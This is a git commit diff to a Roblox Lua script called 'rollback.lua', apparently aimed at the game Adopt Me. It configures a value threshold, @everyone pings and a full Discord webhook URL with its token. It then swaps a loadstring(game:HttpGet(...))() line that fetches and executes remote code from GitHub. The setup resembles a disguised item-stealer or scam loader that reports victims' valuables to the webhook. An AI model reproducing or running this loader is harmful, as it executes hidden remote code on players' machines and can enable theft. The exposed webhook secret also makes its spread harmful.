1d0519b32e553f5d919e7249dab72133ae13bd6a
asiazzz <rubianiasia0@gmail.com>
2026-01-07 20:49:20 +0100

    Update rollback.lua

--- rollback.lua
+++ rollback.lua
@@ -3,4 +3,4 @@ _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1458519646222417934/K91HbptSTYoqYkv41JDuL2ibD1VGzyTxrUKT5B3Tfg-5YUScHtzk8vE6rxHIdej7x8bF" -- change to your webhook
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/asiazzz/rollback/refs/heads/main/adoptmerollback"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/asiazzz/rollback/refs/heads/main/source.lua"))()
